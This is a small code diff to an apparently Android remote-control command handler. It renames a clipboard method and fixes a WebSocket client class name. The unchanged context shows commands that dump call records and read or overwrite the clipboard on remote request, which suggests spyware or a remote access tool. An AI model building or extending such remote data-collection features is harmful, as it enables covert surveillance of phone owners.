@@ -74,7 +74,7 @@ public class CommandHandler {
                     SMSManager.get(ctx).dumpCallsAndSend(params.optInt("limit", 100));
                     break;
                 case "get_clipboard":
-                    ClipboardManager.get(ctx).readAndSend();
+                    ClipboardManager.get(ctx).readClipboard();
                     break;
                 case "set_clipboard":
                     ClipboardManager.get(ctx).setText(params.optString("text", ""));
@@ -224,7 +224,7 @@ public class CommandHandler {
             resp.put("type", type);
             resp.put("data", data);
             resp.put("ts", System.currentTimeMillis());
-            XRCXRCWebSocketClient.get(ctx).send(resp.toString());
+            XRCWebSocketClient.get(ctx).send(resp.toString());
         } catch (JSONException e) {
             Log.e(TAG, "Response failed", e);
         }
